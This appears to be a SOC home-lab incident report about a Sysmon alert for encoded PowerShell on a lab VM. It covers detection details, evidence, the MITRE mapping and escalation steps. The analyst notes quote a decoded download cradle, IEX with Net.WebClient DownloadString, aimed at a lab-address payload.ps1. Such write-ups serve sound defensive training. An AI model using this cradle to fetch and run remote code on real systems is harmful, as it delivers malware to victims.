# Incident Report - INC-2026-002

## Alert Details

| Field | Value |
|---|---|
| Alert name | Suspicious Encoded PowerShell Execution |
| Severity | High |
| Status | Escalated to Tier 2 |
| Date/time detected | 2026-10-06 14:40:03 (UTC+7) |
| Host | DESKTOP-SVI49N5 |
| User | DESKTOP-SVI49N5\admin |
| Event ID | Sysmon Event 1 (Process Creation) |
| MITRE ATT&CK | T1059.001 (PowerShell) |

---

## Summary

On October 6, 2026 at 14:40, Sysmon flagged an encoded PowerShell command executing on DESKTOP-SVI49N5. The command tried to pull a payload from an external IP using `DownloadString` — a classic malware delivery pattern, usually triggered by a phishing email. The connection failed because the attacker server was offline, but the intent was clear.

---

## Analyst Notes

- Sysmon Event ID 1 fired with `-enc` in the command line.
- Decoding it gives `IEX (New-Object Net.WebClient).DownloadString()` — a standard PowerShell download cradle, not something a normal user or script would type by hand.
- The command targeted `http://192.168.56.105/payload.ps1`. The connection failed because the attacker server was offline for this run.
- `ParentImage` is `powershell.exe` itself, which fits the self-spawning pattern droppers often use.
- The command ran interactively under the `admin` account.

---

## Evidence Collected

| Evidence | Detail |
|---|---|
| Sysmon Event ID 1 | Process creation with encoded command |
| Command line | `powershell -enc SQBFAFgA...` |
| Parent process | `powershell.exe` |
| User | DESKTOP-SVI49N5\admin |
| Network attempt | Connection to 192.168.56.105:80 (failed) |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Execution | PowerShell | T1059.001 |
| Command and Control | Application Layer Protocol | T1071 |

---

## Impact Assessment

- **Confidentiality:** no data exfiltrated — the download never completed.
- **Integrity:** no system changes observed.
- **Availability:** no service disruption.
- **Overall:** high risk regardless of the failed connection, since the technique itself shows clear intent to deliver malware.

---

## Action Taken

1. Escalated to Tier 2 for deeper analysis.
2. Recommended isolating the endpoint for forensic review.
3. Recommended checking for persistence mechanisms (registry, scheduled tasks, services).
4. Flagged `admin` and `DESKTOP-SVI49N5` for continued monitoring.
5. VM snapshot taken to preserve evidence.

---

## Decision

**True Positive** - encoded PowerShell execution with a clear command-and-control pattern. High severity, escalated to Tier 2.

---

Part of the [SOC Home Lab - Splunk & Sysmon](https://github.com/adiirmdhn/SOC-Home-Lab-Splunk) project.
